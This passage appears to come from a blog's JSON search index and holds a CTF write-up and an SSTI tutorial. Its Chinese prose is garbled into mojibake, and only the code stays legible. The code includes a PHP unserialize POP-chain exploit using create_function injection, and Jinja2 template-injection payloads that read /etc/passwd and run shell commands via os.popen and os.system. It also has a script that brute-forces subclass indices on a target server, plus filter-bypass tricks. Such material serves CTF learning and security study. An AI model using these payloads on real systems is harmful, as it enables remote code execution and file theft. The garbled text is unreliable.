å‹ç¼©åŒ…......ç»“æœå½“ç„¶å°±æ˜¯å¤±è´¥ï¼ŒæŠ¥é”™ä¿¡æ¯æ˜¯`å‹ç¼©åŒ…ä¸zipç±»å‹æ–‡ä»¶`æˆ‘ç›´æ¥å‚»æ‰ï¼Œä¸€ç›´åœ¨æƒ³å¦‚ä½•æŠŠå‹ç¼©åŒ…çš„content typeç±»å‹è°ƒæˆä»–è¦æ±‚çš„zipï¼Œå®Œå…¨å¿½ç•¥äº†ä»–æ ¹æœ¬è¿›ä¸äº†æˆ‘çš„æœ¬åœ°ç«™ç‚¹...åæ¥éƒ¨ç½²åœ¨vpsä¸ŠæˆåŠŸå¾—ä»¥è§£å†³ï¼›è‡³äºç¬¬äºŒç‚¹ä»éœ€è¦å­¦ä¹ ï¼Œå¸Œæœ›**å¤šæŒ‡æ•™**~","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF Sept X æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ› web","url":"/2022/12/06/2022DASCTF-Sept-X-æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›-web/","content":"# hellounser\nç›´æ¥å¯è¯»æºç \n```\n<?php\nclass A {\n    public $var;\n    public function show(){\n        echo $this->var;\n    }\n    public function __invoke(){\n        $this->show();\n    }\n}\n\nclass B{\n    public $func;\n    public $arg;\n    \n    public function show(){\n        $func = $this->func;\n        if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this->arg)) { \n            die('No!No!No!'); \n        } else { \n            include \"flag.php\";\n            //There is no code to print flag in flag.php\n            $func('', $this->arg); \n        }\n    }\n    \n    public function __toString(){\n        $this->show();\n        return \"<br>\".\"Nice Job!!\".\"<br>\";\n    }\n    \n    \n}\n\nif(isset($_GET['pop'])){\n    $aaa = unserialize($_GET['pop']);\n    $aaa();\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\nå®¡è®¡ä»£ç å‘ç°éœ€è¦GETæ–¹å¼ä¼ å…¥â€popâ€ï¼Œç„¶åç»ååºåˆ—åŒ–åè¢«è°ƒç”¨ã€‚\nAç±»ä¸­çš„`_invoke()`é­”æœ¯æ–¹æ³•èƒ½åœ¨Aç±»è¢«è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œä»è€Œè°ƒç”¨`show()`å‡½æ•°ï¼Œè¾“å‡º`$var`ï¼Œè€ŒBç±»ä¸­çš„`_toString()`é­”æœ¯æ–¹æ³•èƒ½åœ¨Bç±»è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ï¼Œè‹¥è®©`$var=B`ç±»ï¼Œåˆ™`_toString()`è¢«è§¦å‘æ—¶è°ƒç”¨Bçš„`show()`å‡½æ•°ã€‚\næŸ¥çœ‹Bç±»ä¸­`show()`å‡½æ•°ï¼Œ`func`ã€`arg`è¢«ç»•è¿‡ååˆ™å¯åŒ…å«â€flag.phpâ€æ–‡ä»¶ï¼Œæ³¨é‡Šä¸­æåˆ°ä¸ä¼šè¾“å‡ºï¼Œä¾¿åªèƒ½ä¾èµ–`$func`å‡½æ•°â€”â€”æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸”èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¯åˆ©ç”¨`cretae_function`ï¼Œæ—¢ç»•è¿‡äº†`func`çš„åŒ¹é…ï¼Œåˆå¯ä»¥æ‰§è¡Œï¼ˆè¿™é‡Œéœ€è¦ç”¨`}`é—­åˆå‡½æ•°ï¼‰ã€‚\nç”±æ­¤æ„é€ å¦‚ä¸‹ä»£ç \n\n```\n$a=new A();\n$b=new B();\n\n$b->func=\"create_function\";\n$b->arg=\"}var_dump(get_defined_vars());//\";\n$a->var=$b;\n\necho urlencode(serialize($a));\n```\n\nä¼ å…¥`â€ cretae_functionâ€`ä½œä¸º$å‡½æ•°åï¼Œç„¶åå°†`\"}var_dump(get_defined_vars());//\"`ä¼ å…¥`arg`ï¼Œä»è€Œç»•è¿‡äº†åŒ¹é…å¹¶æ‰§è¡Œ`$func('', $this->arg); `ï¼Œç›¸å½“äºæ‰§è¡Œå¦‚ä¸‹ä»£ç \n\n```\ncreate_function(\"\",}var_dump(get_defined_vars());//)\nä¹Ÿå³--------->\ncfunction(\"\"){\n}var_dump(get_defined_vars());//}\n```\n\nè¿™é‡Œçš„`var_dump()`å‡½æ•°å¯ä»¥è¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ï¼Œæ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ï¼ˆå…¶ä¸­æ•°ç»„ä¼šé€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ï¼‰ï¼›è€Œ`get_defined_vars()`å‡½æ•°èƒ½è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªå‡½æ•°èƒ½çœ‹åˆ°æ‰€æœ‰å·²å®šä¹‰å˜é‡ã€‚\nç»ä»¥ä¸Šä»£ç æ‰§è¡Œä¾¿å¯å¾—åˆ°åºåˆ—åŒ–`$a`çš„urlç¼–ç ï¼Œä¼ å…¥åå¾—åˆ°\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220816220606569-998092554.png)\nå‘ç°çœŸæ­£çš„flagè—åœ¨ä¸€ä¸ªå«Tru3flag.phpçš„æ–‡ä»¶é‡Œï¼Œå› æ­¤base64ç»•è¿‡åï¼Œç”¨`require()`å‡½æ•°åŒ…å«æ‰§è¡Œ[æˆ–è€…catæŸ¥çœ‹ç”¨å–åç»•è¿‡çš„åŠæ³•]\n`require(base64_decode(VHJ1M2ZsYWcucGhw));`\nä¿®æ”¹åçš„å®Œæ•´ä»£ç å¦‚ä¸‹\n\n```\nclass A {\n    public $var;\n    public function show(){\n        echo $this->var;\n    }\n    public function __invoke(){\n        $this->show();\n    }\n}\n\nclass B{\n    public $func;\n    public $arg;\n    \n    public function show(){\n        $func = $this->func;\n        if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this->arg)) { \n            die('No!No!No!'); \n        } else { \n            include \"flag.php\";\n            //There is no code to print flag in flag.php\n            $func('', $this->arg); \n        }\n    }\n    \n    public function __toString(){\n        $this->show();  \n        return \"<br>\".\"Nice Job!!\".\"<br>\";\n    } \n}\n\n$a=new A();\n$b=new B();\n\n$b->func=\"create_function\";\n$b->arg=\"}require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//\";\n$a->var=$b;\n/*\ncreate_function(\"\",}var_dump(get_defined_vars());//)\n--------->\ncfunction(\"\"){\n}var_dump(get_defined_vars());//}\n*/\necho urlencode(serialize($a));\n?>\n```\n\nå¾—åˆ°flag\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220816221213537-1615985978.png)\n\n---\né™„ç»å¸¸ä½¿ç”¨åˆ°çš„**é­”æœ¯æ–¹æ³•**\nï¼ˆæ¥è‡ª [phpååºåˆ—åŒ–æ¼æ´ä¹‹POPé“¾æ„é€ ](https://www.jianshu.com/p/7ec82ffc457d)ï¼‰\n\n```\n__construct()  //å½“å¯¹è±¡åˆ›å»ºæ—¶è§¦å‘\n__destruct()   //å½“å¯¹è±¡é”€æ¯æ—¶è§¦å‘\n__wakeup()     //å½“ä½¿ç”¨unserializeæ—¶è§¦å‘\n__sleep()     //å½“ä½¿ç”¨serializeæ—¶è§¦å‘\n__destruct()  //å½“å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘\n__call()      //å½“å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘\n__get()       //å½“è®¿é—®ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§æ—¶è§¦å‘\n__set()       //å½“è®¾ç½®ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è§¦å‘\n__toString()  //å½“æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘\n__invoke()    //å½“å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘\n```","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰","url":"/2022/12/06/æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰/","content":"# ä¸€ã€SSTIç®€ä»‹\nSSTIï¼Œ å³ **Server-Side Template Injectionï¼ŒæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥**ã€‚\n\n## 1ã€SSTIäº§ç”ŸåŸå› \nåœ¨MVCæ¡†æ¶ä¸­ï¼Œç”¨æˆ·çš„è¾“å…¥é€šè¿‡ View æ¥æ”¶ï¼Œäº¤ç»™ Controller ï¼Œç„¶åç”± Controller è°ƒç”¨ Model æˆ–è€…å…¶ä»–çš„ Controller è¿›è¡Œå¤„ç†ï¼Œæœ€åå†è¿”å›ç»™View ï¼Œè¿™æ ·å°±æœ€ç»ˆæ˜¾ç¤ºåœ¨æˆ‘ä»¬çš„é¢å‰äº†ï¼Œé‚£ä¹ˆè¿™é‡Œçš„ **View** ä¸­å°±ä¼šå¤§é‡åœ°ç”¨åˆ°ä¸€ç§å«åš**æ¨¡æ¿**çš„æŠ€æœ¯ã€‚\nç»•è¿‡æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥åï¼Œ**æœªç»ä»»ä½•å¤„ç†**å°±å°†å…¶ä½œä¸ºwebåº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ¨¡æ¿å¼•æ“åœ¨**è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“**çš„è¿›ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ¶æ„æ”»å‡»è€…æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå°±ä¼šå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShellç­‰é—®é¢˜ã€‚\n>**ç½‘ç«™æ¨¡æ¿å¼•æ“:**\næ¨¡æ¿å¼•æ“ï¼ˆè¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“ï¼‰æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºç½‘ç«™çš„æ¨¡æ¿å¼•æ“å°±ä¼šç”Ÿæˆä¸€ä¸ªæ ‡å‡†çš„HTMLæ–‡æ¡£ã€‚\næ¨¡æ¿å¼•æ“å¯ä»¥è®©ï¼ˆç½‘ç«™ï¼‰ç¨‹åºå®ç°ç•Œé¢ä¸æ•°æ®åˆ†ç¦»ï¼Œä¸šåŠ¡ä»£ç ä¸é€»è¾‘ä»£ç çš„åˆ†ç¦»ï¼Œè¿™å°±å¤§å¤§æå‡äº†å¼€å‘æ•ˆç‡ï¼Œè‰¯å¥½çš„è®¾è®¡ä¹Ÿä½¿å¾—ä»£ç é‡ç”¨å˜å¾—æ›´åŠ å®¹æ˜“ã€‚\n\n>ç°è¡Œçš„æ¨¡æ¿å¼•æ“æœ‰:\nPHP çš„     Smarty, Twig, Blade.\nJava çš„    JSP, FreeMareker, Velocity.\nPython çš„  Flask(Jinja2), django, tornado\n\n......\n\nç®€å•æ¥è¯´ï¼Œå¯ä»¥ç†è§£ä¸ºåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„HTMLä»£ç ã€‚æ¨¡æ¿å¼•æ“ä¼šä¼šæä¾›ä¸€å¥—ç”ŸæˆHTMLä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œå°†å…¶æ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œæœ€åç”Ÿæˆæ¨¡æ¿+ç”¨æˆ·æ•°æ®çš„å‰ç«¯HTMLé¡µé¢ï¼Œåé¦ˆç»™æµè§ˆå™¨ï¼Œä»è€Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚å½“è¿™é‡Œçš„â€œç”¨æˆ·çš„æ•°æ®â€å…·æœ‰æ¶æ„æ”»å‡»æ€§è€Œåˆä¸è¢«å¤„ç†æ—¶ï¼ŒSSTIå°±å‘ç”Ÿäº†ã€‚\n\n## 2ã€SSTIæ£€æµ‹å·¥å…· Tplmap\n\n>å·¥å…·åœ°å€:https://github.com/epinna/tplmap\nå®‰è£…æ•™ç¨‹:https://www.cnblogs.com/ktsm/p/15691652.html\nä½¿ç”¨æ•™ç¨‹ï¼šhttps://blog.csdn.net/EC_Carrot/article/details/109709767\n\nã€å‚è€ƒèµ„æ–™ï¼š**[è¯¦è§£SSTIæ¨¡æ¿æ³¨å…¥](https://blog.csdn.net/LYJ20010728/article/details/120205725)**ã€‘\n\n# äºŒã€SSTI åˆ©ç”¨\n>ä»¥Flaskï¼ˆJinja2ï¼‰ä¸ºä¾‹ï¼ˆwindowsï¼‰ï¼Œè¯¥ç‰ˆå—ä»…æ¶‰åŠä¸»æœºä¸Šçš„pythonè¯­æ³•\n\n## â… . åŸºç¡€çŸ¥è¯†\n### 1ã€Python å†…å»ºå‡½æ•°\nå¯åŠ¨ python è§£é‡Šå™¨æ—¶ï¼Œå³ä½¿æ²¡æœ‰åˆ›å»ºä»»ä½•å˜é‡æˆ–å‡½æ•°è¿˜æ˜¯ä¼šæœ‰å¾ˆå¤šå‡½æ•°å¯ä¾›ä½¿ç”¨ï¼Œè¿™äº›å°±æ˜¯ python çš„å†…å»ºå‡½æ•°ã€‚åœ¨ Python äº¤äº’æ¨¡å¼ä¸‹ï¼Œä½¿ç”¨å‘½ä»¤ `dir('builtins')` å³å¯æŸ¥çœ‹å½“å‰ Python ç‰ˆæœ¬çš„ä¸€äº›å†…å»ºå˜é‡ã€å†…å»ºå‡½æ•°ï¼Œ**å†…å»ºå‡½æ•°å¯ä»¥è°ƒç”¨ä¸€åˆ‡å‡½æ•°**ã€‚\n### 2ã€Python ç±»ç»§æ‰¿\nPython ä¸­ä¸€åˆ‡çš†ä¸ºå¯¹è±¡ï¼Œå‡ç»§æ‰¿äº object å¯¹è±¡ï¼ŒPython ä¸­çš„ object ç±»ä¸­é›†æˆäº†å¾ˆå¤šçš„åŸºç¡€å‡½æ•°ï¼Œå‡å¦‚éœ€è¦åœ¨ payload ä¸­ä½¿ç”¨æŸä¸ªå‡½æ•°å°±éœ€è¦ç”¨ object å»æ“ä½œã€‚\n\nå¸¸è§çš„**ç»§æ‰¿å…³ç³»**æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š\n\n```\n1. base ï¼šå¯¹è±¡çš„ä¸€ä¸ªåŸºç±»ï¼Œä¸€èˆ¬æ˜¯object\n2. mro  ï¼šè·å–å¯¹è±¡çš„åŸºç±»ï¼Œåªæ˜¯è¿™æ—¶ä¼šæ˜¾ç¤ºæ•´ä¸ªç»§æ‰¿é“¾çš„å…³ç³»ï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œè€Œobjectåœ¨æœ€åˆ—è¡¨çš„æœ€é¡¶å±‚ï¼Œé€šè¿‡mro[-1]å¯ä»¥è·å–åˆ°\n3. subclasses() : ç»§æ‰¿æ­¤å¯¹è±¡çš„å­ç±»ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨\n```\n\n## â…¡. æ„é€ payload\n<br>\n\n**æ”»å‡»æ–¹å¼ä¸ºï¼šå˜é‡->å¯¹è±¡->åŸºç±»->å­ç±»éå†->å…¨å±€å˜é‡**\n\n### 1ã€ç›¸å…³å±æ€§\n\n```\nå¯¹äºè¿”å›çš„æ˜¯ç±»å®ä¾‹ï¼š\n1. __class__            //è¿”å›å®ä¾‹çš„å¯¹è±¡ï¼Œå¯ä»¥ä½¿å®ä¾‹æŒ‡å‘classï¼Œä»è€Œä½¿ç”¨ä¸‹é¢çš„é­”æœ¯æ–¹æ³•\nå¦‚ï¼š\n>>>''.__class__  \n<class 'str'>\n\nå¯¹äºè¿”å›çš„æ˜¯å®šä¹‰çš„classç±»ï¼š\n2. __base__              //è¿”å›ç±»çš„çˆ¶äº² python3\n3. __mro__               //è¿”å›ç±»ç»§æ‰¿çš„å…ƒç»„ï¼Œå³å¯»æ‰¾çˆ¶ç±» python3\n4. __subclasses__()      //è¿”å›ç±»ä¸­ä»ç„¶å¯ç”¨çš„å¼•ç”¨ï¼Œå¯ä»¥æ­¤è·å–æƒ³è¦çš„ç±»çš„å¯¹è±¡ python3\nå¦‚ï¼š\n>>> ''.__class__.__mro__[-1].__subclasses__()[138]  \n<class 'os._wrap_close'>   \nTipï¼šæ ¹æ®ç´¢å¼•å€¼æ¥è·å–æƒ³ç”¨çš„å¯åˆ©ç”¨ç±»,ä¸åŠ ç´¢å¼•ä¼šè¾“å‡ºå…¨éƒ¨å­˜æ´»çš„å¼•ç”¨\n\n5. __builtins__          //ä½œä¸ºé»˜è®¤åˆå§‹æ¨¡å—å‡ºç°ï¼Œå¯ç”¨äºæŸ¥çœ‹å½“å‰æ‰€æœ‰å¯¼å…¥çš„å†…å»ºå‡½æ•°\n6. __globals__           //å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ã€‚å¦‚æœæŸä¸ªæ–‡ä»¶è°ƒç”¨äº†osã€sysç­‰åº“ï¼Œä½†æˆ‘ä»¬åªèƒ½è®¿é—®è¯¥æ–‡ä»¶æŸä¸ªå‡½æ•°æˆ–è€…æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨globalså±æ€§è®¿é—®å…¨å±€çš„å˜é‡ python3\n7. __init__              //è¿”å›ç±»çš„åˆå§‹åŒ–æ–¹æ³•\nå¦‚ï¼š\n>>> ''.__class__.__bases__[0].__subclasses__()[38].__init__\n<slot wrapper '__init__' of 'object' objects>\nTip: 'wrapper'æ˜¯æŒ‡è¿™äº›å‡½æ•°å¹¶æ²¡æœ‰è¢«é‡è½½ï¼Œè¿™æ—¶ä»–ä»¬å¹¶ä¸æ˜¯functionï¼Œä¸å…·æœ‰__globals__å±æ€§\n```\n\n### 2ã€ä¸€ä¸ªç®€å•çš„payloadå¯»æ‰¾è¿‡ç¨‹\n#### â… . æ‰¾åˆ°`__globals__`å…¨å±€\næ ¹æ®ä¸Šè¿°å±æ€§ï¼Œæ‰¾åˆ°é‡è½½è¿‡çš„ `__init__` ç±»ï¼ˆåœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦ `wrapper` çš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå› æ­¤å¯»æ‰¾**`ä¸å¸¦ warpper`** çš„å³å¯ï¼‰ï¼Œå¹¶é€šè¿‡ `__globals__` å…¨å±€æ¥æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•åŠå˜é‡åŠå‚æ•°ï¼Œæˆ–è€…è·å– `file` ã€ `os` ç­‰æ¨¡å—ä»¥è¿›è¡Œä¸‹ä¸€æ­¥çš„åˆ©ç”¨ã€‚\n\n```\n>>> ''.__class__.__bases__[0].__subclasses__()[138].__init__\n<function _wrap_close.__init__ at 0x0000025AA50BAEE0>\n```\n\n#### â…¡. æŸ¥çœ‹å…¶å¼•ç”¨`__builtins__`\n\n```\n''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']            \nTipï¼šè¿™é‡Œä¼šè¿”å› dict ç±»å‹ï¼Œå¯»æ‰¾ keys ä¸­å¯ç”¨å‡½æ•°ï¼Œä½¿ç”¨ keys ä¸­çš„ file ç­‰å‡½æ•°æ¥å®ç°è¯»å–æ–‡ä»¶çš„åŠŸèƒ½\n```\n\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220915221230348-826204857.png)\n\n#### â…¢. ä½¿ç”¨å¯åˆ©ç”¨å‡½æ•°å®ç°æ–‡ä»¶è¯»å–åŠŸèƒ½ç­‰\n\n`''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()\n`\n### 3ã€å¸¸ç”¨çš„ç›®æ ‡å‡½æ•°\n\n```\nfile\nsubprocess.Popen\nos.popen\nexec\neval\n```\n\n>å‡ ä¸ªå«æœ‰`eval`å‡½æ•°çš„ç±»ï¼š\nwarnings.catch_warnings\nWarningMessage\ncodecs.IncrementalEncoder\ncodecs.IncrementalDecoder\ncodecs.StreamReaderWriter\nos._wrap_close\nreprlib.Repr\nweakref.finalize\n......\n\n### 4ã€å‘½ä»¤æ‰§è¡Œ\nPythonå¸¸ç”¨çš„ä¸‰ç§**å‘½ä»¤æ‰§è¡Œ**æ–¹å¼ï¼š\n\n> `os.system()`\nè¯¥æ–¹æ³•çš„å‚æ•°å°±æ˜¯ string ç±»å‹çš„å‘½ä»¤ï¼Œåœ¨ linux ä¸Šè¿”å›å€¼ä¸ºæ‰§è¡Œå‘½ä»¤çš„ exit å€¼ï¼›è€Œwindowsä¸Šè¿”å›å€¼åˆ™æ˜¯è¿è¡Œå‘½ä»¤å shell çš„è¿”å›å€¼ï¼›æ³¨æ„ï¼šè¯¥å‡½æ•°è¿”å›å‘½ä»¤**æ‰§è¡Œç»“æœçš„è¿”å›å€¼**ï¼Œå¹¶ä¸æ˜¯è¿”å›å‘½ä»¤çš„æ‰§è¡Œè¾“å‡ºï¼ˆæ‰§è¡ŒæˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1ï¼‰ï¼Œå› æ­¤éœ€è¦é…åˆ curl å¤–å¸¦æ•°æ®æŸ¥çœ‹å›æ˜¾          #è¿™é‡Œç”»ä¸ªé—®å· \n\n> `os.popen()`\nè¿”å›çš„æ˜¯ file read çš„å¯¹è±¡ï¼Œå¦‚æœæƒ³è·å–æ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºï¼Œåˆ™éœ€è¦è°ƒç”¨è¯¥å¯¹è±¡çš„ read() æ–¹æ³•\n\n> ç›´æ¥å¯»æ‰¾ `os` æ¨¡å—æ‰§è¡Œå‘½ä»¤\nå…ˆç¼–å†™è„šæœ¬éå†Pythonä¸­å«æœ‰osæ¨¡å—çš„ç±»çš„ç´¢å¼•å·ï¼Œç„¶åé€‰å–å…¶ä¸­ä¸€ä¸ªæ„é€ payloadæ‰§è¡Œå‘½ä»¤ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n```\nimport requests\n\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'\n}\n\nfor i in range(500):\n    url = \"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\"\n\n    res = requests.get(url=url, headers=headers)\n    if 'os.py' in res.text:\n        print(i)\n```\n\n<br>\n\nç”¨ä¾‹:\n\n```\n''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\")\nTip: éœ€è¦å¯¼å…¥osæ¨¡å—\n''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('dir').read()\")\nTip: éœ€è¦å¯¼å…¥osæ¨¡å—\n\n''.__class__.__mro__[-1].__subclasses__()[79].__init__.__globals__['os'].popen('dir').read()\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå³ä½¿æ˜¯ä½¿ç”¨osæ¨¡å—æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¹Ÿæ˜¯è°ƒç”¨çš„osæ¨¡å—ä¸­çš„popenå‡½æ•°ï¼Œé‚£æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨popenå‡½æ•°ï¼Œå­˜åœ¨popenå‡½æ•°çš„ç±»ä¸€èˆ¬æ˜¯ `os._wrap_close`ï¼Œä½†ä¹Ÿä¸ç»å¯¹ã€‚ç”±äºç›®æ ‡Pythonç¯å¢ƒçš„ä¸åŒï¼Œæˆ‘ä»¬è¿˜éœ€è¦éå†ä¸€ä¸‹ã€‚\n<br>\n\n>äº‹å®ä¸Šï¼Œåœ¨æœ¬åœ°pythonç¯å¢ƒä¸‹ï¼Œå¯ä»¥ç›´æ¥åœ¨`os._wrap_close`æ‰¾åˆ°popenå‡½æ•°ï¼š\n`''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read()`\n\nã€å‚è€ƒèµ„æ–™ï¼š[ä»¥ Bypass ä¸ºä¸­å¿ƒè°­è°ˆ Flask-jinja2 SSTI çš„åˆ©ç”¨](https://xz.aliyun.com/t/9584#toc-17)ã€‘\n\n# ä¸‰ã€æ¨¡æ¿æ³¨å…¥ç»•è¿‡\n## 1ã€è¯­æ³•\nå®˜æ–¹æ–‡æ¡£å¯¹äºæ¨¡æ¿çš„éƒ¨åˆ†è¯­æ³•ä»‹ç»å¦‚ä¸‹ï¼ˆä»ç„¶ä»¥jinja2ä¸ºä¾‹ï¼š[Template Designer Documentation](https://jinja.palletsprojects.com/en/2.11.x/templates/)ï¼‰\n\n>1 åŸºæœ¬è¯­æ³•\n```\n{% ... %} for Statements \nå¯ç”¨æ¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ç”¨ä»¥å¾ªç¯è¯­å¥å’Œæ¡ä»¶è¯­å¥\n{{ ... }} for Expressions to print to the template output\nç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º\n{# ... #} for Comments not included in the template output\nè¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š\n#  ... # for Line Statements\n## å¯ä»¥æœ‰å’Œ {%%} ç›¸åŒçš„æ•ˆæœ\n```\n>2 dot(.)çš„ç»•è¿‡\n```\nYou can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ â€œsubscriptâ€ syntax ([]). --å®˜æ–¹åŸæ–‡\nå¯ä»¥ç”¨ . æˆ–è€… [] æ¥è®¿é—®å˜é‡çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´\n{{\"\".__class__}}  ç­‰ä»·äº  {{\"\"['__classs__']}}\n```\nå› æ­¤ï¼Œå½“`.`è¢«è¿‡æ»¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`[]`ä»¥ç»•è¿‡ã€‚\n>3 å¦‚æœæƒ³è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶æœ¬è´¨å…¶å®æ˜¯è°ƒç”¨äº†é­”æœ¯æ–¹æ³•`__getitem__`\n\næ‰€ä»¥å¯¹äºå–**å­—å…¸ä¸­é”®å€¼**çš„æƒ…å†µä¸ä»…å¯ä»¥ç”¨`[]`ï¼Œä¹Ÿå¯ä»¥ç”¨`__getitem__`\n```\n{{url_for.__globals__['__builtins__']}}\n{{url_for.__globals__.__getitem__('__builtins__')}}\n```\n>4 è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œå…·ä½“æ˜¯è°ƒç”¨äº†é­”æœ¯æ–¹æ³•`__getattribute__`\n```\n\"\".__class__\n\"\".__getattribute__(\"__class__\")\n```\n>5 **`lipsum`**\n**flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š**\n\n```\n{{lipsum.__globals__['os'].popen('ls').read()}}\n#åœ¨CTFä¸­å¾ˆå¥½ç”¨\n```\nã€å‚è€ƒèµ„æ–™ï¼š[SSTI](https://lazzzaro.github.io/2020/05/15/web-SSTI/)ã€‘\n## 2ã€ç»•è¿‡\n### â… . å­—ç¬¦ä¸²\n1ã€æ‹¼æ¥\n```\"cla\"+\"ss\"```\n\n2ã€åè½¬\n```\"__ssalc__\"[::-1]```\n\n3ã€ç¼–ç 